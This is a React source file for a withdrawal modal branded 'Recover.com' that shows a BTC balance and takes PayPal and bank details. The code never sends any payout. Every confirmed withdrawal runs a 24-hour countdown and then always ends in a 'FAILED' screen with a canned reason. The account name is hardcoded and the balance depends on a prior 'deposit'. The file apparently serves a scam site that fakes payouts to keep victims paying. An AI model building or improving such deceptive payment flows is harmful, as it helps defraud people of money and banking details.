import { useState, useEffect } from "react";
import { ArrowLeft, X, ChevronRight, AlertCircle, CheckCircle, XCircle } from "lucide-react";
import { useWithdrawals, FAILURE_REASON } from "@/context/WithdrawalContext";
import { usePendingDeposit } from "@/context/PendingDepositContext";

interface Props {
  onClose: () => void;
}

type Step = "method" | "details" | "pending" | "failed";

const METHODS = [
  {
    id: "paypal",
    name: "PayPal",
    popular: true,
    sub: "Linked PayPal account",
    fee: "Fee: 2.5%",
    time: "Instant – 1 day",
    icon: (
      <svg viewBox="0 0 24 24" fill="none" className="w-6 h-6">
        <rect x="2" y="5" width="20" height="14" rx="2" stroke="#8b5cf6" strokeWidth="1.8" />
        <path d="M2 10h20" stroke="#8b5cf6" strokeWidth="1.8" />
      </svg>
    ),
    iconBg: "bg-purple-500/10 border border-purple-500/30",
  },
];

const ASSETS = [
  { id: "btc", name: "Bitcoin (BTC)", balance: null },
];

function pad(n: number) {
  return String(n).padStart(2, "0");
}

export default function WithdrawModal({ onClose }: Props) {
  const { addWithdrawal } = useWithdrawals();
  const { amount: depositAmount, completed: depositCompleted } = usePendingDeposit();
  const availableBalance = depositCompleted ? depositAmount : 0;

  const [step, setStep] = useState<Step>("method");
  const [selectedMethod, setSelectedMethod] = useState<(typeof METHODS)[0] | null>(null);
  const [amount, setAmount] = useState("");
  const [asset, setAsset] = useState("btc");
  const [chimeContact, setChimeContact] = useState("");
  const [holderName, setHolderName] = useState("Nicholas Nicholson");
  const [bankName, setBankName] = useState("");
  const [routingNum, setRoutingNum] = useState("");
  const [accountNum, setAccountNum] = useState("");
  const [paypalEmail, setPaypalEmail] = useState("");
  const [wireBank, setWireBank] = useState("");
  const [swiftCode, setSwiftCode] = useState("");

  const [pendingAmount, setPendingAmount] = useState("");
  const [pendingMethod, setPendingMethod] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(86400);

  useEffect(() => {
    if (step !== "pending") return;
    const interval = setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          clearInterval(interval);
          setStep("failed");
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [step]);

  const hh = pad(Math.floor(secondsLeft / 3600));
  const mm = pad(Math.floor((secondsLeft % 3600) / 60));
  const ss = pad(secondsLeft % 60);
  const progress = ((86400 - secondsLeft) / 86400) * 100;

  const canSubmit = !!(amount && parseFloat(amount) > 0 && paypalEmail && holderName);

  function handleConfirm() {
    const fmt = `$${parseFloat(amount).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
    setPendingAmount(fmt);
    setPendingMethod(selectedMethod?.name ?? "");
    setSecondsLeft(86400);
    addWithdrawal({
      amount: parseFloat(amount),
      method: selectedMethod?.name ?? "",
      asset,
      accountHolder: holderName,
    });
    setStep("pending");
  }

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={step === "pending" || step === "failed" ? undefined : onClose} />

      <div className="relative w-full max-w-sm bg-[#0f1923] rounded-t-3xl sm:rounded-3xl border border-[#1e2530] max-h-[90vh] overflow-y-auto">

        {/* ── STEP 1: METHOD SELECTION ── */}
        {step === "method" && (
          <div className="p-5 pb-8">
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center">
                  <span className="text-blue-400 font-bold text-sm">$</span>
                </div>
                <div>
                  <h2 className="text-white font-bold text-base">Withdraw Funds</h2>
                  <p className="text-gray-400 text-xs">Choose a withdrawal method</p>
                </div>
              </div>
              <button onClick={onClose} className="w-8 h-8 rounded-full bg-[#1e2530] flex items-center justify-center">
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </div>
            <div className="space-y-3">
              {METHODS.map((m) => (
                <button
                  key={m.id}
                  onClick={() => { setSelectedMethod(m); setStep("details"); }}
                  className="w-full bg-[#0d1117] border border-[#1e2530] hover:border-blue-600/40 rounded-2xl p-4 flex items-center gap-3 text-left transition-colors"
                >
                  <div className={`w-11 h-11 rounded-2xl flex items-center justify-center flex-shrink-0 ${m.iconBg}`}>
                    {m.icon}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <p className="text-white text-sm font-bold">{m.name}</p>
                      {m.popular && (
                        <span className="text-[10px] bg-[#00d4aa]/10 text-[#00d4aa] border border-[#00d4aa]/30 px-1.5 py-0.5 rounded font-bold tracking-wide">POPULAR</span>
                      )}
                    </div>
                    <p className="text-gray-400 text-xs mt-0.5">{m.sub}</p>
                  </div>
                  <div className="text-right flex-shrink-0">
                    <p className="text-white text-xs font-semibold">{m.fee}</p>
                    <p className="text-gray-500 text-[11px] mt-0.5">{m.time}</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-gray-600 flex-shrink-0" />
                </button>
              ))}
            </div>
          </div>
        )}

        {/* ── STEP 2: DETAILS FORM ── */}
        {step === "details" && selectedMethod && (
          <div className="p-5 pb-8">
            <div className="flex items-center gap-3 mb-5">
              <button onClick={() => setStep("method")} className="w-8 h-8 rounded-full bg-[#1e2530] flex items-center justify-center flex-shrink-0">
                <ArrowLeft className="w-4 h-4 text-gray-400" />
              </button>
              <div className="flex items-center gap-2 flex-1">
                <div className="w-7 h-7 rounded-full bg-blue-500/20 flex items-center justify-center">
                  <span className="text-blue-400 font-bold text-xs">$</span>
                </div>
                <div>
                  <h2 className="text-white font-bold text-sm">Withdraw via {selectedMethod.name}</h2>
                  <p className="text-gray-400 text-xs">Enter withdrawal details</p>
                </div>
              </div>
              <button onClick={onClose} className="w-8 h-8 rounded-full bg-[#1e2530] flex items-center justify-center flex-shrink-0">
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </div>

            <div className="rounded-2xl p-4 mb-4 text-center" style={{ background: "linear-gradient(135deg, #0f2042, #1a1060)" }}>
              <p className="text-blue-200/70 text-xs mb-1">Available for Withdrawal</p>
              <p className="text-white text-2xl font-black">${availableBalance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
              <p className={`text-xs mt-1 font-medium ${depositCompleted ? "text-green-400" : "text-amber-400"}`}>
                {depositCompleted ? "Cleared · Ready to transfer" : "Pending confirmation"}
              </p>
            </div>

            <div className="bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 flex items-center gap-2.5 mb-4">
              <div className={`w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0 ${selectedMethod.iconBg}`}>
                {selectedMethod.icon}
              </div>
              <div>
                <p className="text-white text-sm font-semibold">{selectedMethod.name}</p>
                <p className="text-gray-400 text-xs">{selectedMethod.fee.replace("Fee: ", "")} fee · {selectedMethod.time}</p>
              </div>
            </div>

            <div className="mb-4">
              <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">From Asset</p>
              <div className="bg-[#0d1117] border border-[#1e2530] rounded-xl overflow-hidden">
                {ASSETS.map((a, i) => (
                  <button
                    key={a.id}
                    onClick={() => setAsset(a.id)}
                    className={`w-full flex items-center justify-between px-4 py-3 text-left transition-colors ${i > 0 ? "border-t border-[#1e2530]" : ""} ${asset === a.id ? "bg-blue-600/10" : "hover:bg-white/5"}`}
                  >
                    <span className="text-white text-sm font-medium">{a.name}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-gray-400 text-xs">${availableBalance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
                      {asset === a.id && <CheckCircle className="w-4 h-4 text-blue-400" />}
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="mb-4">
              <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Withdrawal Amount (USD)</p>
              <div className="bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 flex items-center gap-2">
                <span className="text-gray-400 text-sm font-medium">$</span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="flex-1 bg-transparent text-white text-sm outline-none placeholder-gray-600"
                />
                <button onClick={() => setAmount(availableBalance.toFixed(2))} className="text-blue-400 text-xs font-bold">MAX</button>
              </div>
              <p className="text-gray-600 text-xs mt-1.5 px-1">Enter the amount you wish to withdraw</p>
            </div>

            {selectedMethod.id === "chime" && (
              <>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Recipient Wallet Address</p>
                  <input type="text" value={chimeContact} onChange={(e) => setChimeContact(e.target.value)} placeholder="Enter destination wallet address"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50 font-mono" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Recipient Name</p>
                  <input type="text" value={holderName} onChange={(e) => setHolderName(e.target.value)} placeholder="Full name of wallet owner"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
              </>
            )}
            {selectedMethod.id === "ach" && (
              <>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Bank Name</p>
                  <input type="text" value={bankName} onChange={(e) => setBankName(e.target.value)} placeholder="e.g. Wells Fargo"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Routing Number</p>
                  <input type="text" value={routingNum} onChange={(e) => setRoutingNum(e.target.value)} placeholder="9-digit routing number"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Account Number</p>
                  <input type="text" value={accountNum} onChange={(e) => setAccountNum(e.target.value)} placeholder="Bank account number"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Account Holder Name</p>
                  <input type="text" value={holderName} onChange={(e) => setHolderName(e.target.value)} placeholder="Full legal name"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
              </>
            )}
            {selectedMethod.id === "wire" && (
              <>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Bank Name</p>
                  <input type="text" value={wireBank} onChange={(e) => setWireBank(e.target.value)} placeholder="Receiving bank name"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">SWIFT / BIC Code</p>
                  <input type="text" value={swiftCode} onChange={(e) => setSwiftCode(e.target.value)} placeholder="e.g. CHASUS33"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">Account Holder Name</p>
                  <input type="text" value={holderName} onChange={(e) => setHolderName(e.target.value)} placeholder="Full legal name"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
              </>
            )}
            {selectedMethod.id === "paypal" && (
              <>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">PayPal Account Name</p>
                  <input type="text" value={holderName} readOnly
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none opacity-90" />
                </div>
                <div className="mb-4">
                  <p className="text-gray-400 text-[11px] font-bold uppercase tracking-widest mb-2">PayPal Email</p>
                  <input type="email" value={paypalEmail} onChange={(e) => setPaypalEmail(e.target.value)} placeholder="PayPal account email"
                    className="w-full bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 text-white text-sm outline-none placeholder-gray-600 focus:border-blue-600/50" />
                </div>
              </>
            )}

            <div className="bg-amber-900/20 border border-amber-800/40 rounded-xl p-3.5 flex items-start gap-2.5 mb-5">
              <AlertCircle className="w-4 h-4 text-amber-400 flex-shrink-0 mt-0.5" />
              <p className="text-gray-300 text-xs leading-relaxed">
                Withdrawal requests are reviewed for compliance. Processing may take up to <span className="text-white font-bold">24 hours</span>.
              </p>
            </div>

            <button
              onClick={handleConfirm}
              disabled={!canSubmit}
              className={`w-full py-4 rounded-xl font-semibold text-sm transition-all ${canSubmit ? "bg-blue-600 hover:bg-blue-700 text-white" : "bg-[#1e2530] text-gray-600 cursor-not-allowed"}`}
            >
              Confirm Withdrawal
            </button>
          </div>
        )}

        {/* ── STEP 3: PENDING ── */}
        {step === "pending" && (
          <div className="p-6 pb-10 flex flex-col items-center">
            <div className="w-full flex justify-end mb-2">
              <button onClick={onClose} className="w-8 h-8 rounded-full bg-[#1e2530] flex items-center justify-center">
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </div>
            <div className="flex items-center gap-2 mb-6">
              <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center">
                <svg viewBox="0 0 24 24" fill="white" className="w-3.5 h-3.5"><circle cx="12" cy="12" r="10" /></svg>
              </div>
              <span className="text-white text-sm font-semibold">Recover.com</span>
            </div>
            <div className="flex items-center gap-2 bg-amber-900/30 border border-amber-700/40 px-4 py-1.5 rounded-full mb-5">
              <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse inline-block" />
              <span className="text-amber-400 text-xs font-bold tracking-widest">PENDING.</span>
            </div>
            <p className="text-white text-4xl font-black mb-1">{pendingAmount}</p>
            <p className="text-gray-400 text-sm mb-7">via {pendingMethod}</p>
            <div className="w-full bg-[#0d1117] border border-[#1e2530] rounded-2xl p-5 mb-4">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest text-center mb-4">Time Remaining</p>
              <div className="flex items-end justify-center gap-3 mb-4">
                <div className="text-center">
                  <p className="text-white text-4xl font-black tabular-nums">{hh}</p>
                  <p className="text-gray-600 text-[10px] font-semibold uppercase tracking-wider mt-1">HH</p>
                </div>
                <p className="text-gray-400 text-3xl font-bold mb-1">:</p>
                <div className="text-center">
                  <p className="text-white text-4xl font-black tabular-nums">{mm}</p>
                  <p className="text-gray-600 text-[10px] font-semibold uppercase tracking-wider mt-1">MM</p>
                </div>
                <p className="text-gray-400 text-3xl font-bold mb-1">:</p>
                <div className="text-center">
                  <p className="text-white text-4xl font-black tabular-nums">{ss}</p>
                  <p className="text-gray-600 text-[10px] font-semibold uppercase tracking-wider mt-1">SS</p>
                </div>
              </div>
              <div className="w-full h-1.5 bg-[#1e2530] rounded-full overflow-hidden">
                <div className="h-full rounded-full bg-amber-400 transition-all duration-1000" style={{ width: `${Math.max(progress, 0.5)}%` }} />
              </div>
            </div>
            <div className="w-full bg-[#0d1117] border border-[#1e2530] rounded-2xl divide-y divide-[#1e2530]">
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Method</span>
                <span className="text-white text-sm font-semibold">{pendingMethod}</span>
              </div>
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Status</span>
                <span className="text-amber-400 text-sm font-semibold">Processing</span>
              </div>
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Est. completion</span>
                <span className="text-white text-sm font-semibold">Within 24 hours</span>
              </div>
            </div>
            <p className="text-gray-600 text-xs text-center mt-5 leading-relaxed">
              You'll be notified once reviewed. Do not close this account during review.
            </p>
          </div>
        )}

        {/* ── STEP 4: FAILED ── */}
        {step === "failed" && (
          <div className="p-6 pb-10 flex flex-col items-center">
            <div className="w-full flex justify-end mb-2">
              <button onClick={onClose} className="w-8 h-8 rounded-full bg-[#1e2530] flex items-center justify-center">
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </div>
            <div className="flex items-center gap-2 mb-6">
              <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center">
                <svg viewBox="0 0 24 24" fill="white" className="w-3.5 h-3.5"><circle cx="12" cy="12" r="10" /></svg>
              </div>
              <span className="text-white text-sm font-semibold">Recover.com</span>
            </div>
            <div className="w-16 h-16 rounded-full bg-red-900/30 border-2 border-red-700/40 flex items-center justify-center mb-4">
              <XCircle className="w-8 h-8 text-red-400" />
            </div>
            <div className="flex items-center gap-2 bg-red-900/30 border border-red-700/40 px-4 py-1.5 rounded-full mb-4">
              <span className="w-2 h-2 rounded-full bg-red-400 inline-block" />
              <span className="text-red-400 text-xs font-bold tracking-widest">FAILED</span>
            </div>
            <p className="text-white text-3xl font-black mb-1">{pendingAmount}</p>
            <p className="text-gray-400 text-sm mb-6">via {pendingMethod}</p>

            <div className="w-full bg-red-950/30 border border-red-800/50 rounded-2xl p-4 mb-4">
              <p className="text-red-400 text-xs font-bold uppercase tracking-wider mb-2">Reason for Failure</p>
              <p className="text-gray-300 text-sm leading-relaxed">{FAILURE_REASON}</p>
            </div>

            <div className="w-full bg-[#0d1117] border border-[#1e2530] rounded-2xl divide-y divide-[#1e2530] mb-5">
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Method</span>
                <span className="text-white text-sm font-semibold">{pendingMethod}</span>
              </div>
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Status</span>
                <span className="text-red-400 text-sm font-semibold">Failed</span>
              </div>
              <div className="flex items-center justify-between px-4 py-3">
                <span className="text-gray-400 text-sm">Amount</span>
                <span className="text-red-400 text-sm font-semibold">-{pendingAmount}</span>
              </div>
            </div>

            <button onClick={onClose} className="w-full bg-[#1e2530] text-white font-semibold py-4 rounded-xl text-sm hover:bg-[#252d3a] transition-colors">
              Close
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
